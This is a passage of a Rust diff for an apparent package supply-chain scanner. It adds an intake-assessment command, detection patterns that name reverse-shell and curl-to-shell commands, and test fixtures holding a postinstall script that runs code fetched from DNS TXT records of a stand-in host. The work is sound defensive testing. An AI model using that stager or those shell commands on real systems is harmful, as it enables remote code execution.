@@ -191,6 +191,22 @@ pub enum Command {
         execute: bool,
         json: bool,
     },
+    IntakeAssess {
+        workspace: Option<String>,
+        ecosystem: Option<String>,
+        state_dir: Option<String>,
+        helper_path: Option<String>,
+        scanner_receipt: Option<String>,
+        execute: bool,
+        json: bool,
+        ai_review: bool,
+        ai_provider: Option<String>,
+        ai_model: Option<String>,
+        ai_timeout_seconds: Option<u64>,
+        timeout_seconds: Option<u64>,
+        tool: String,
+        args: Vec<String>,
+    },
     PackageRiskAssess {
         workspace: Option<String>,
         ecosystem: Option<String>,
@@ -547,6 +563,7 @@ pub fn parse_command(args: &[String]) -> Command {
             execute: rest.iter().any(|arg| arg == "--execute"),
             json: rest.iter().any(|arg| arg == "--json"),
         },
+        [cmd, sub, rest @ ..] if cmd == "intake" && sub == "assess" => parse_intake_assess(rest),
         [cmd, sub, kind, path, rest @ ..] if cmd == "source" && sub == "scan" => {
             Command::SourceScan {
                 kind: kind.clone(),
@@ -1007,6 +1024,37 @@ fn render_command_text(command: Command) -> String {
             execute,
             json,
         ),
+        Command::IntakeAssess {
+            workspace,
+            ecosystem,
+            state_dir,
+            helper_path,
+            scanner_receipt,
+            execute,
+            json,
+            ai_review,
+            ai_provider,
+            ai_model,
+            ai_timeout_seconds,
+            timeout_seconds,
+            tool,
+            args,
+        } => render_intake_assess(IntakeAssessArgs {
+            workspace: workspace.as_deref(),
+            ecosystem: ecosystem.as_deref(),
+            state_dir: state_dir.as_deref(),
+            helper_path: helper_path.as_deref(),
+            scanner_receipt: scanner_receipt.as_deref(),
+            execute,
+            json,
+            ai_review,
+            ai_provider: ai_provider.as_deref(),
+            ai_model: ai_model.as_deref(),
+            ai_timeout_seconds,
+            timeout_seconds,
+            tool: &tool,
+            args: &args,
+        }),
         Command::PackageRiskAssess {
             workspace,
             ecosystem,
@@ -1395,6 +1443,7 @@ fn command_help() -> String {
         "|scanners list [--json]",
         "|scanners bootstrap-plan [--json]",
         "|scanners run --workspace <path> [--ecosystem auto|npm|pypi] [--state-dir <dir>] [--timeout-seconds <n>] [--execute] [--json]",
+        "|intake assess --workspace <path> [--ecosystem auto|npm|pypi|uv] [--state-dir <dir>] [--helper <path>] [--scanner-receipt <path>] [--no-ai-review|--ai-review --ai-provider ollama --ai-model <model> --ai-timeout-seconds <n>] [--timeout-seconds <n>] [--execute] [--json] npm|pip|uv -- <args>",
         "|package-risk assess --workspace <path> [--ecosystem auto|npm|pypi|uv] [--state-dir <dir>] [--scanner-receipt <path>] [--ai-review --ai-provider ollama --ai-model <model> --ai-timeout-seconds <n>] [--json]",
         "|package-risk history --package <name> --ecosystem <npm|pypi|uv> [--state-dir <dir>] [--json]",
         "|package-risk approve --receipt <path> --reason <text> [--state-dir <dir>] [--json]",
@@ -1659,6 +1708,149 @@ fn parse_vm_detonate(args: &[String]) -> Command {
         fixture,
         timeout_seconds,
         json,
+    }
+}
+
+fn parse_intake_assess(args: &[String]) -> Command {
+    let mut execute = false;
+    let mut json = false;
+    let mut ai_review = true;
+    let mut state_dir = None;
+    let mut helper_path = None;
+    let mut workspace = None;
+    let mut scanner_receipt = None;
+    let mut ecosystem = None;
+    let mut ai_provider = None;
+    let mut ai_model = None;
+    let mut ai_timeout_seconds = None;
+    let mut timeout_seconds = None;
+    let mut index = 0;
+    while index < args.len() {
+        match args[index].as_str() {
+            "--execute" => {
+                execute = true;
+                index += 1;
+            }
+            "--json" => {
+                json = true;
+                index += 1;
+            }
+            "--ai-review" => {
+                ai_review = true;
+                index += 1;
+            }
+            "--no-ai-review" => {
+                ai_review = false;
+                index += 1;
+            }
+            "--state-dir" => {
+                state_dir = args.get(index + 1).cloned();
+                index += 2;
+            }
+            value if value.starts_with("--state-dir=") => {
+                state_dir = Some(value.trim_start_matches("--state-dir=").to_string());
+                index += 1;
+            }
+            "--helper" => {
+                helper_path = args.get(index + 1).cloned();
+                index += 2;
+            }
+            value if value.starts_with("--helper=") => {
+                helper_path = Some(value.trim_start_matches("--helper=").to_string());
+                index += 1;
+            }
+            "--workspace" => {
+                workspace = args.get(index + 1).cloned();
+                index += 2;
+            }
+            value if value.starts_with("--workspace=") => {
+                workspace = Some(value.trim_start_matches("--workspace=").to_string());
+                index += 1;
+            }
+            "--scanner-receipt" => {
+                scanner_receipt = args.get(index + 1).cloned();
+                index += 2;
+            }
+            value if value.starts_with("--scanner-receipt=") => {
+                scanner_receipt = Some(value.trim_start_matches("--scanner-receipt=").to_string());
+                index += 1;
+            }
+            "--ecosystem" => {
+                ecosystem = args.get(index + 1).cloned();
+                index += 2;
+            }
+            value if value.starts_with("--ecosystem=") => {
+                ecosystem = Some(value.trim_start_matches("--ecosystem=").to_string());
+                index += 1;
+            }
+            "--ai-provider" => {
+                ai_provider = args.get(index + 1).cloned();
+                index += 2;
+            }
+            value if value.starts_with("--ai-provider=") => {
+                ai_provider = Some(value.trim_start_matches("--ai-provider=").to_string());
+                index += 1;
+            }
+            "--ai-model" => {
+                ai_model = args.get(index + 1).cloned();
+                index += 2;
+            }
+            value if value.starts_with("--ai-model=") => {
+                ai_model = Some(value.trim_start_matches("--ai-model=").to_string());
+                index += 1;
+            }
+            "--ai-timeout-seconds" => {
+                ai_timeout_seconds = args.get(index + 1).and_then(|value| value.parse().ok());
+                index += 2;
+            }
+            value if value.starts_with("--ai-timeout-seconds=") => {
+                ai_timeout_seconds = value
+                    .trim_start_matches("--ai-timeout-seconds=")
+                    .parse()
+                    .ok();
+                index += 1;
+            }
+            "--timeout-seconds" => {
+                timeout_seconds = args.get(index + 1).and_then(|value| value.parse().ok());
+                index += 2;
+            }
+            value if value.starts_with("--timeout-seconds=") => {
+                timeout_seconds = value.trim_start_matches("--timeout-seconds=").parse().ok();
+                index += 1;
+            }
+            value if value.starts_with("--") => return Command::Help,
+            _ => break,
+        }
+    }
+
+    let Some(tool) = args.get(index).cloned() else {
+        return Command::Help;
+    };
+    if !matches!(tool.as_str(), "npm" | "pip" | "uv") {
+        return Command::Help;
+    }
+    let remaining = &args[index + 1..];
+    let command_args = if matches!(remaining.first(), Some(separator) if separator == "--") {
+        remaining[1..].to_vec()
+    } else {
+        remaining.to_vec()
+    };
+
+    Command::IntakeAssess {
+        workspace,
+        ecosystem,
+        state_dir,
+        helper_path,
+        scanner_receipt,
+        execute,
+        json,
+        ai_review,
+        ai_provider,
+        ai_model,
+        ai_timeout_seconds,
+        timeout_seconds,
+        tool,
+        args: command_args,
     }
 }
 
@@ -8349,6 +8541,20 @@ fn red_team_gate_cases() -> Vec<RedTeamGateCase> {
             forbidden_markers: COMMON_FORBIDDEN.to_vec(),
         },
         RedTeamGateCase {
+            name: "static_dns_txt_stager_block",
+            category: "static_manifest",
+            comparator: "dns_txt_payload_stager",
+            path: "/v1/static-manifest-job-simulations",
+            body: "manifest=dns_txt_stager".to_string(),
+            expected_status: 409,
+            required_markers: vec![
+                "\"status\":\"fail_closed\"",
+                "\"evidence_binding_ready\":false",
+                "npm_static_dns_txt_stager",
+            ],
+            forbidden_markers: COMMON_FORBIDDEN.to_vec(),
+        },
+        RedTeamGateCase {
             name: "static_pypi_pep517_suspicion",
             category: "static_manifest",
             comparator: "guarddog_pypi_build_backend",
@@ -10895,6 +11101,247 @@ struct PackageRiskMemoryRecord {
     scanner_evidence_reason_codes: Vec<String>,
 }
 
+const INTAKE_ASSESSMENT_SCHEMA: &str = "whoathere.intake_assessment.v1";
+
+struct IntakeAssessArgs<'a> {
+    workspace: Option<&'a str>,
+    ecosystem: Option<&'a str>,
+    state_dir: Option<&'a str>,
+    helper_path: Option<&'a str>,
+    scanner_receipt: Option<&'a str>,
+    execute: bool,
+    json: bool,
+    ai_review: bool,
+    ai_provider: Option<&'a str>,
+    ai_model: Option<&'a str>,
+    ai_timeout_seconds: Option<u64>,
+    timeout_seconds: Option<u64>,
+    tool: &'a str,
+    args: &'a [String],
+}
+
+fn render_intake_assess(args: IntakeAssessArgs<'_>) -> String {
+    let Some(workspace) = args.workspace else {
+        return intake_assess_error("intake_workspace_required", args.json);
+    };
+    if !Path::new(workspace).is_dir() {
+        return intake_assess_error("intake_workspace_not_directory", args.json);
+    }
+    if !matches!(args.tool, "npm" | "pip" | "uv") {
+        return intake_assess_error("intake_tool_unsupported", args.json);
+    }
+    let package_ecosystem = match args.ecosystem {
+        Some(value) => match PackageRiskEcosystem::parse(value) {
+            Some(parsed) => parsed.as_str().to_string(),
+            None => return intake_assess_error("intake_ecosystem_invalid", args.json),
+        },
+        None => intake_package_ecosystem_for_tool(args.tool).to_string(),
+    };
+
+    let package_risk = evaluate_command(Command::PackageRiskAssess {
+        workspace: Some(workspace.to_string()),
+        ecosystem: Some(package_ecosystem.clone()),
+        state_dir: args.state_dir.map(ToString::to_string),
+        scanner_receipt: args.scanner_receipt.map(ToString::to_string),
+        ai_review: args.ai_review,
+        ai_provider: args.ai_provider.map(ToString::to_string),
+        ai_model: args.ai_model.map(ToString::to_string),
+        ai_timeout_seconds: args.ai_timeout_seconds,
+        json: true,
+    });
+    let vm_detonation = evaluate_command(Command::VmDetonate {
+        tool: args.tool.to_string(),
+        args: args.args.to_vec(),
+        execute: args.execute,
+        sync_back: false,
+        state_dir: args.state_dir.map(ToString::to_string),
+        helper_path: args.helper_path.map(ToString::to_string),
+        workspace: Some(workspace.to_string()),
+        package_risk_receipt: None,
+        fixture: None,
+        timeout_seconds: args.timeout_seconds,
+        json: true,
+    });
+
+    let vm_verdict = json_extract_string_field(&vm_detonation.output, "verdict");
+    let vm_sync_back_enabled =
+        json_extract_bool_field(&vm_detonation.output, "sync_back_enabled").unwrap_or(true);
+    let vm_dynamic_clean_evidence = args.execute
+        && vm_detonation.exit_code == ExitCode::Allow.code()
+        && !vm_sync_back_enabled
+        && matches!(vm_verdict.as_deref(), Some("helper_observed_clean"));
+
+    let mut reason_codes = Vec::new();
+    reason_codes.push("intake_sync_back_disabled".to_string());
+    if args.ai_review {
+        reason_codes.push("intake_ai_review_requested".to_string());
+    } else {
+        reason_codes.push("intake_ai_review_not_requested".to_string());
+    }
+    if args.scanner_receipt.is_some() {
+        reason_codes.push("intake_scanner_receipt_requested".to_string());
+    } else {
+        reason_codes.push("intake_scanner_receipt_not_requested".to_string());
+    }
+    if !args.execute {
+        reason_codes.push("intake_vm_execute_required".to_string());
+    }
+    match package_risk.exit_code {
+        code if code == ExitCode::Allow.code() => {
+            reason_codes.push("intake_package_risk_clean".to_string())
+        }
+        code if code == ExitCode::Deny.code() => {
+            reason_codes.push("intake_package_risk_denied".to_string())
+        }
+        code if code == ExitCode::ManualReview.code() => {
+            reason_codes.push("intake_package_risk_manual_review".to_string())
+        }
+        _ => reason_codes.push("intake_package_risk_error".to_string()),
+    }
+    if args.execute {
+        match vm_detonation.exit_code {
+            code if code == ExitCode::Allow.code() => {
+                if vm_dynamic_clean_evidence {
+                    reason_codes.push("intake_vm_dynamic_clean_observed".to_string());
+                } else {
+                    reason_codes.push("intake_vm_dynamic_clean_evidence_missing".to_string());
+                }
+            }
+            code if code == ExitCode::Deny.code() || code == ExitCode::ManualReview.code() => {
+                reason_codes.push("intake_vm_detonation_not_clean".to_string())
+            }
+            _ => reason_codes.push("intake_vm_detonation_error".to_string()),
+        }
+    }
+    if vm_sync_back_enabled {
+        reason_codes.push("intake_vm_sync_back_unexpected".to_string());
+    }
+    reason_codes = sorted_unique(reason_codes);
+
+    let package_risk_error = !matches!(
+        package_risk.exit_code,
+        code if code == ExitCode::Allow.code()
+            || code == ExitCode::Deny.code()
+            || code == ExitCode::ManualReview.code()
+    );
+    let vm_error = args.execute
+        && !matches!(
+            vm_detonation.exit_code,
+            code if code == ExitCode::Allow.code()
+                || code == ExitCode::Deny.code()
+                || code == ExitCode::ManualReview.code()
+        );
+    let hard_deny = package_risk.exit_code == ExitCode::Deny.code()
+        || vm_detonation.exit_code == ExitCode::Deny.code();
+    let final_exit_code = if package_risk_error || vm_error {
+        if package_risk.exit_code == ExitCode::Misuse.code()
+            || vm_detonation.exit_code == ExitCode::Misuse.code()
+        {
+            ExitCode::Misuse.code()
+        } else {
+            ExitCode::InternalError.code()
+        }
+    } else if hard_deny {
+        ExitCode::Deny.code()
+    } else if package_risk.exit_code == ExitCode::Allow.code() && vm_dynamic_clean_evidence {
+        ExitCode::Allow.code()
+    } else {
+        ExitCode::ManualReview.code()
+    };
+    let verdict = if final_exit_code == ExitCode::Allow.code() {
+        "observed_clean_no_sync"
+    } else if !args.execute {
+        "dry_run_execute_required"
+    } else if hard_deny {
+        "deny"
+    } else if package_risk_error || vm_error {
+        "error_fail_closed"
+    } else if !vm_dynamic_clean_evidence {
+        "manual_review_dynamic_evidence_missing"
+    } else {
+        "manual_review"
+    };
+
+    let redacted_args = args
+        .args
+        .iter()
+        .map(|arg| redacted_scalar(arg))
+        .collect::<Vec<_>>();
+    if args.json {
+        return format!(
+            "{{\n  \"command\": \"whoathere intake assess\",\n  \"schema_version\": {},\n  \"workspace\": {},\n  \"package_ecosystem\": {},\n  \"tool\": {},\n  \"argv\": {},\n  \"execute_requested\": {},\n  \"sync_back_enabled\": false,\n  \"ai_review_requested\": {},\n  \"scanner_receipt_requested\": {},\n  \"verdict\": {},\n  \"reason_codes\": {},\n  \"exit_code\": {},\n  \"package_risk_exit_code\": {},\n  \"vm_detonation_exit_code\": {},\n  \"package_risk\": {},\n  \"vm_detonation\": {}\n}}",
+            json_string(INTAKE_ASSESSMENT_SCHEMA),
+            json_string(&redacted_scalar(workspace)),
+            json_string(&package_ecosystem),
+            json_string(args.tool),
+            json_string_array(&redacted_args),
+            args.execute,
+            args.ai_review,
+            args.scanner_receipt.is_some(),
+            json_string(verdict),
+            json_string_array(&reason_codes),
+            final_exit_code,
+            package_risk.exit_code,
+            vm_detonation.exit_code,
+            json_embedded_report(&package_risk.output),
+            json_embedded_report(&vm_detonation.output)
+        );
+    }
+
+    format!(
+        "whoathere intake assess\nschema_version={}\nfinal_exit_code={}\nworkspace={}\npackage_ecosystem={}\ntool={}\nargv={:?}\nexecute_requested={}\nsync_back_enabled=false\nai_review_requested={}\nscanner_receipt_requested={}\nverdict={}\nreason_codes={:?}\npackage_risk_exit_code={}\nvm_detonation_exit_code={}\n--- package-risk report ---\n{}\n--- vm detonation report ---\n{}",
+        INTAKE_ASSESSMENT_SCHEMA,
+        final_exit_code,
+        redacted_scalar(workspace),
+        package_ecosystem,
+        args.tool,
+        redacted_args,
+        args.execute,
+        args.ai_review,
+        args.scanner_receipt.is_some(),
+        verdict,
+        reason_codes,
+        package_risk.exit_code,
+        vm_detonation.exit_code,
+        package_risk.output,
+        vm_detonation.output
+    )
+}
+
+fn intake_package_ecosystem_for_tool(tool: &str) -> &'static str {
+    match tool {
+        "npm" => "npm",
+        "pip" => "pypi",
+        "uv" => "uv",
+        _ => "auto",
+    }
+}
+
+fn json_embedded_report(output: &str) -> String {
+    let trimmed = output.trim();
+    if trimmed.starts_with('{') && trimmed.ends_with('}') {
+        trimmed.to_string()
+    } else {
+        json_string(trimmed)
+    }
+}
+
+fn intake_assess_error(reason_code: &str, json: bool) -> String {
+    if json {
+        return format!(
+            "{{\n  \"command\": \"whoathere intake assess\",\n  \"schema_version\": {},\n  \"status\": \"error\",\n  \"reason_code\": {},\n  \"exit_code\": {}\n}}",
+            json_string(INTAKE_ASSESSMENT_SCHEMA),
+            json_string(reason_code),
+            ExitCode::Misuse.code()
+        );
+    }
+    format!(
+        "whoathere intake assess\nschema_version={}\nstatus=error\nreason_code={reason_code}\nfinal_exit_code={}",
+        INTAKE_ASSESSMENT_SCHEMA,
+        ExitCode::Misuse.code()
+    )
+}
+
 struct PackageRiskAssessArgs<'a> {
     workspace: Option<&'a str>,
     ecosystem: Option<&'a str>,
@@ -12262,7 +12709,7 @@ fn build_local_artifact_review_prompt(
     format!(
         "You are reviewing a Node/Python package workspace for software supply-chain risk.\n\
 Return JSON only with this exact shape: {{\"risk\":\"clean|suspicious\",\"reason_codes\":[\"short_snake_case\"],\"summary\":\"one short sentence\"}}.\n\
-Treat install scripts, credential or environment access, network activity, process spawning, obfuscation, native/binary artifacts, direct/VCS/editable sources, platform-specific activation, and delayed CI behavior as suspicious.\n\
+Treat install scripts, credential or environment access, DNS TXT payload staging, fetched shell execution, reverse-shell capability, network activity, process spawning, obfuscation, native/binary artifacts, direct/VCS/editable sources, platform-specific activation, and delayed CI behavior as suspicious.\n\
 Never recommend execution or host sync-back; this model output is advisory evidence only.\n\
 Schema: {PACKAGE_ARTIFACT_REVIEW_SCHEMA}\n\
 Requested ecosystem: {}\n\
@@ -13145,6 +13592,9 @@ fn package_risk_indicator_blocks_auto_sync(indicator: &str) -> bool {
         || indicator.contains("prepare")
         || indicator.contains("credential")
         || indicator.contains("network")
+        || indicator.contains("dns_txt")
+        || indicator.contains("shell_stager")
+        || indicator.contains("reverse_shell")
         || indicator.contains("native")
         || indicator.contains("binary")
         || indicator.contains("pth")
@@ -13394,6 +13844,15 @@ fn source_text_risk_indicators(contents: &str) -> Vec<String> {
     {
         indicators.push("network_capability_observed".to_string());
     }
+    if contains_dns_txt_stager_text(&lowered) {
+        indicators.push("dns_txt_payload_stager_observed".to_string());
+    }
+    if contains_remote_shell_stager_text(&lowered) {
+        indicators.push("remote_shell_stager_observed".to_string());
+    }
+    if contains_reverse_shell_text(&lowered) {
+        indicators.push("reverse_shell_capability_observed".to_string());
+    }
     if lowered.contains("child_process")
         || lowered.contains("subprocess")
         || lowered.contains("exec(")
@@ -13415,6 +13874,53 @@ fn source_text_risk_indicators(contents: &str) -> Vec<String> {
         indicators.push("delayed_ci_activation_marker".to_string());
     }
     indicators
+}
+
+fn contains_dns_txt_stager_text(lowered: &str) -> bool {
+    lowered.contains("resolvetxt")
+        || lowered.contains("resolve_txt")
+        || lowered.contains("querytxt")
+        || lowered.contains("dns.resolver")
+        || lowered.contains("recordtype.txt")
+        || lowered.contains("type=txt")
+        || lowered.contains("q=txt")
+        || lowered.contains("+short txt")
+        || lowered.contains(" txt ")
+            && (lowered.contains("dig ")
+                || lowered.contains("nslookup ")
+                || lowered.contains("host -t")
+                || lowered.contains("host -a")
+                || lowered.contains("resolve-dnsname"))
+        || lowered.contains(" txt\"") && (lowered.contains("dig ") || lowered.contains("nslookup "))
+        || lowered.contains(" txt'") && (lowered.contains("dig ") || lowered.contains("nslookup "))
+}
+
+fn contains_remote_shell_stager_text(lowered: &str) -> bool {
+    ((lowered.contains("curl ") || lowered.contains("wget "))
+        && (lowered.contains("| sh")
+            || lowered.contains("|sh")
+            || lowered.contains("| bash")
+            || lowered.contains("|bash")
+            || lowered.contains(" sh -c")
+            || lowered.contains(" bash -c")))
+        || (lowered.contains("http://") || lowered.contains("https://"))
+            && (lowered.contains("bash -c")
+                || lowered.contains("sh -c")
+                || lowered.contains("node -e")
+                || lowered.contains("python -c")
+                || lowered.contains("perl -e"))
+        || lowered.contains("invoke-expression")
+        || lowered.contains(" iwr ") && lowered.contains(" iex")
+}
+
+fn contains_reverse_shell_text(lowered: &str) -> bool {
+    lowered.contains("/dev/tcp/")
+        || lowered.contains("nc -e")
+        || lowered.contains("ncat -e")
+        || lowered.contains("bash -i")
+        || lowered.contains("mkfifo ") && lowered.contains("/bin/sh")
+        || lowered.contains("socat ") && lowered.contains("exec:")
+        || lowered.contains("socket.socket(") && lowered.contains("subprocess")
 }
 
 fn package_risk_requirements_files(workspace: &Path) -> Vec<PathBuf> {
@@ -18693,6 +19199,50 @@ mod tests {
     }
 
     #[test]
+    fn parses_intake_assess_command() {
+        let args = vec![
+            "intake".to_string(),
+            "assess".to_string(),
+            "--workspace".to_string(),
+            "/work".to_string(),
+            "--state-dir=/tmp/whoathere-vm".to_string(),
+            "--helper".to_string(),
+            "/tmp/helper".to_string(),
+            "--scanner-receipt".to_string(),
+            "/tmp/scanner.json".to_string(),
+            "--ecosystem".to_string(),
+            "npm".to_string(),
+            "--no-ai-review".to_string(),
+            "--timeout-seconds".to_string(),
+            "45".to_string(),
+            "--execute".to_string(),
+            "--json".to_string(),
+            "npm".to_string(),
+            "--".to_string(),
+            "install".to_string(),
+        ];
+        assert_eq!(
+            parse_command(&args),
+            Command::IntakeAssess {
+                workspace: Some("/work".to_string()),
+                ecosystem: Some("npm".to_string()),
+                state_dir: Some("/tmp/whoathere-vm".to_string()),
+                helper_path: Some("/tmp/helper".to_string()),
+                scanner_receipt: Some("/tmp/scanner.json".to_string()),
+                execute: true,
+                json: true,
+                ai_review: false,
+                ai_provider: None,
+                ai_model: None,
+                ai_timeout_seconds: None,
+                timeout_seconds: Some(45),
+                tool: "npm".to_string(),
+                args: vec!["install".to_string()],
+            }
+        );
+    }
+
+    #[test]
     fn vm_detonate_dry_run_never_invokes_helper_or_syncs() {
         let root = temp_root("whoathere-cli-vm-detonate-dry-run");
         std::fs::write(root.join("package.json"), r#"{"name":"clean"}"#).expect("package json");
@@ -20886,6 +21436,264 @@ exit 0
     }
 
     #[test]
+    fn package_risk_detects_dns_txt_payload_stager_without_execution() {
+        let root = temp_root("whoathere-cli-package-risk-dns-txt");
+        let state_dir = root.join("state");
+        write_new_file(
+            &root.join("package.json"),
+            br#"{
+  "name": "agent-repo-stager-fixture",
+  "version": "1.0.0",
+  "whoatherePublishedAtUnixSeconds": 1700000000,
+  "scripts": {"postinstall": "node postinstall.js"}
+}
+"#,
+        )
+        .expect("package json");
+        write_new_file(
+            &root.join("postinstall.js"),
+            br#"const dns = require("dns");
+const child_process = require("child_process");
+dns.resolveTxt("stage.example", function(_err, records) {
+  child_process.exec(records.join(""));
+});
+"#,
+        )
+        .expect("postinstall");
+
+        let result = evaluate_command(Command::PackageRiskAssess {
+            workspace: Some(root.display().to_string()),
+            ecosystem: Some("npm".to_string()),
+            state_dir: Some(state_dir.display().to_string()),
+            scanner_receipt: None,
+            ai_review: false,
+            ai_provider: None,
+            ai_model: None,
+            ai_timeout_seconds: None,
+            json: true,
+        });
+
+        assert_eq!(result.exit_code, 22);
+        assert!(result
+            .output
+            .contains("\"overall_verdict\": \"manual_review\""));
+        assert!(result.output.contains("npm_lifecycle_script_postinstall"));
+        assert!(result.output.contains("dns_txt_payload_stager_observed"));
+        assert!(result.output.contains("process_spawn_capability_observed"));
+        assert!(!result.output.contains("stage.example"));
+        assert!(!result.output.contains("/Users/"));
+
+        let _ = std::fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn intake_assess_dry_run_fails_closed_without_vm_execution() {
+        let root = temp_root("whoathere-cli-intake-dry-run");
+        write_new_file(
+            &root.join("package.json"),
+            br#"{
+  "name": "whoathere-clean-intake",
+  "version": "1.0.0",
+  "whoatherePublishedAtUnixSeconds": 1700000000,
+  "scripts": {"test": "node index.js"},
+  "dependencies": {}
+}
+"#,
+        )
+        .expect("package json");
+        write_new_file(&root.join("index.js"), b"module.exports = { ok: true };\n")
+            .expect("index js");
+
+        let result = evaluate_command(Command::IntakeAssess {
+            workspace: Some(root.display().to_string()),
+            ecosystem: Some("npm".to_string()),
+            state_dir: Some(root.join("state").display().to_string()),
+            helper_path: Some("/tmp/nonexistent-helper".to_string()),
+            scanner_receipt: None,
+            execute: false,
+            json: false,
+            ai_review: false,
+            ai_provider: None,
+            ai_model: None,
+            ai_timeout_seconds: None,
+            timeout_seconds: Some(30),
+            tool: "npm".to_string(),
+            args: vec!["install".to_string()],
+        });
+
+        assert_eq!(result.exit_code, ExitCode::ManualReview.code());
+        assert!(result.output.contains("final_exit_code=22"));
+        assert!(result.output.contains("verdict=dry_run_execute_required"));
+        assert!(result.output.contains("sync_back_enabled=false"));
+        assert!(result.output.contains("ai_review_requested=false"));
+        assert!(result.output.contains("intake_vm_execute_required"));
+        assert!(result.output.contains("vm_detonation_exit_code=0"));
+        assert!(result.output.contains("\"helper\": null"));
+        let _ = std::fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn intake_assess_dns_txt_stager_blocks_before_any_clean_verdict() {
+        let root = temp_root("whoathere-cli-intake-dns-txt");
+        write_new_file(
+            &root.join("package.json"),
+            br#"{
+  "name": "agent-repo-stager-fixture",
+  "version": "1.0.0",
+  "whoatherePublishedAtUnixSeconds": 1700000000,
+  "scripts": {"postinstall": "node postinstall.js"}
+}
+"#,
+        )
+        .expect("package json");
+        write_new_file(
+            &root.join("postinstall.js"),
+            br#"const dns = require("dns");
+const child_process = require("child_process");
+dns.resolveTxt("stage.example", function(_err, records) {
+  child_process.exec(records.join(""));
+});
+"#,
+        )
+        .expect("postinstall");
+
+        let result = evaluate_command(Command::IntakeAssess {
+            workspace: Some(root.display().to_string()),
+            ecosystem: Some("npm".to_string()),
+            state_dir: Some(root.join("state").display().to_string()),
+            helper_path: Some("/tmp/nonexistent-helper".to_string()),
+            scanner_receipt: None,
+            execute: false,
+            json: false,
+            ai_review: false,
+            ai_provider: None,
+            ai_model: None,
+            ai_timeout_seconds: None,
+            timeout_seconds: Some(30),
+            tool: "npm".to_string(),
+            args: vec!["install".to_string()],
+        });
+
+        assert_eq!(result.exit_code, ExitCode::ManualReview.code());
+        assert!(result.output.contains("intake_package_risk_manual_review"));
+        assert!(result.output.contains("dns_txt_payload_stager_observed"));
+        assert!(result.output.contains("process_spawn_capability_observed"));
+        assert!(!result.output.contains("observed_clean_no_sync"));
+        assert!(!result.output.contains("stage.example"));
+        assert!(!result.output.contains("/Users/"));
+        let _ = std::fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn intake_assess_json_embeds_package_and_vm_reports_without_sync_back() {
+        let root = temp_root("whoathere-cli-intake-json");
+        write_new_file(
+            &root.join("package.json"),
+            br#"{
+  "name": "whoathere-json-intake",
+  "version": "1.0.0",
+  "whoatherePublishedAtUnixSeconds": 1700000000,
+  "dependencies": {}
+}
+"#,
+        )
+        .expect("package json");
+
+        let result = evaluate_command(Command::IntakeAssess {
+            workspace: Some(root.display().to_string()),
+            ecosystem: Some("npm".to_string()),
+            state_dir: Some(root.join("state").display().to_string()),
+            helper_path: Some("/tmp/nonexistent-helper".to_string()),
+            scanner_receipt: None,
+            execute: false,
+            json: true,
+            ai_review: false,
+            ai_provider: None,
+            ai_model: None,
+            ai_timeout_seconds: None,
+            timeout_seconds: Some(30),
+            tool: "npm".to_string(),
+            args: vec!["install".to_string()],
+        });
+
+        assert_eq!(result.exit_code, ExitCode::ManualReview.code());
+        assert!(result
+            .output
+            .contains("\"command\": \"whoathere intake assess\""));
+        assert!(result
+            .output
+            .contains("\"schema_version\": \"whoathere.intake_assessment.v1\""));
+        assert!(result.output.contains("\"sync_back_enabled\": false"));
+        assert!(result.output.contains("\"ai_review_requested\": false"));
+        assert!(result
+            .output
+            .contains("\"verdict\": \"dry_run_execute_required\""));
+        assert!(result.output.contains("\"package_risk\": {"));
+        assert!(result.output.contains("\"vm_detonation\": {"));
+        assert!(result.output.contains("\"intake_vm_execute_required\""));
+        let _ = std::fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn intake_assess_returns_clean_only_with_package_and_vm_evidence() {
+        let root = temp_root("whoathere-cli-intake-clean");
+        let state_dir = root.with_extension("state");
+        let _ = std::fs::remove_dir_all(&state_dir);
+        write_complete_guest_provisioning_receipt(&state_dir);
+        write_new_file(
+            &root.join("package.json"),
+            br#"{
+  "name": "whoathere-clean-intake",
+  "version": "1.0.0",
+  "whoatherePublishedAtUnixSeconds": 1700000000,
+  "main": "index.js",
+  "private": true,
+  "dependencies": {}
+}
+"#,
+        )
+        .expect("package json");
+        write_new_file(&root.join("index.js"), b"module.exports = { ok: true };\n")
+            .expect("index js");
+        let scanner_receipt = state_dir.join("scanner.json");
+        write_scanner_run_receipt(&scanner_receipt, Some(&state_dir), &root, true, &[]);
+        let helper = state_dir.join("helper.sh");
+        write_new_file(&helper, b"#!/bin/sh\nexit 0\n").expect("helper script");
+        set_executable(&helper).expect("executable helper");
+
+        let result = evaluate_command(Command::IntakeAssess {
+            workspace: Some(root.display().to_string()),
+            ecosystem: Some("npm".to_string()),
+            state_dir: Some(state_dir.display().to_string()),
+            helper_path: Some(helper.display().to_string()),
+            scanner_receipt: Some(scanner_receipt.display().to_string()),
+            execute: true,
+            json: true,
+            ai_review: false,
+            ai_provider: None,
+            ai_model: None,
+            ai_timeout_seconds: None,
+            timeout_seconds: Some(30),
+            tool: "npm".to_string(),
+            args: vec!["install".to_string()],
+        });
+
+        assert_eq!(result.exit_code, ExitCode::Allow.code());
+        assert!(result
+            .output
+            .contains("\"verdict\": \"observed_clean_no_sync\""));
+        assert!(result.output.contains("\"sync_back_enabled\": false"));
+        assert!(result
+            .output
+            .contains("\"intake_vm_dynamic_clean_observed\""));
+        assert!(result.output.contains("\"intake_package_risk_clean\""));
+        assert!(result.output.contains("\"package_risk_exit_code\": 0"));
+        assert!(result.output.contains("\"vm_detonation_exit_code\": 0"));
+        let _ = std::fs::remove_dir_all(&state_dir);
+        let _ = std::fs::remove_dir_all(&root);
+    }
+
+    #[test]
     fn package_risk_detects_poisoned_pinned_update_against_last_known_good() {
         let root = temp_root("whoathere-cli-package-risk-poisoned-update");
         let state_dir = root.join("state");
@@ -22192,10 +23000,11 @@ exit 0
         let result = evaluate_command(Command::VmRedTeamGate { json: false });
         assert_eq!(result.exit_code, 0);
         assert!(result.output.contains("passed=true"));
-        assert!(result.output.contains("case_count=18"));
+        assert!(result.output.contains("case_count=19"));
         assert!(result.output.contains("public_network_used=false"));
         assert!(result.output.contains("external_scanners_required=false"));
         assert!(result.output.contains("static_npm_postinstall_block"));
+        assert!(result.output.contains("static_dns_txt_stager_block"));
         assert!(result.output.contains("dynamic_npm_postinstall_exfil"));
         assert!(result.output.contains("dynamic_pypi_pep517_backend_abuse"));
         assert!(result.output.contains("dynamic_dns_tunneling"));
@@ -22216,7 +23025,7 @@ exit 0
             .output
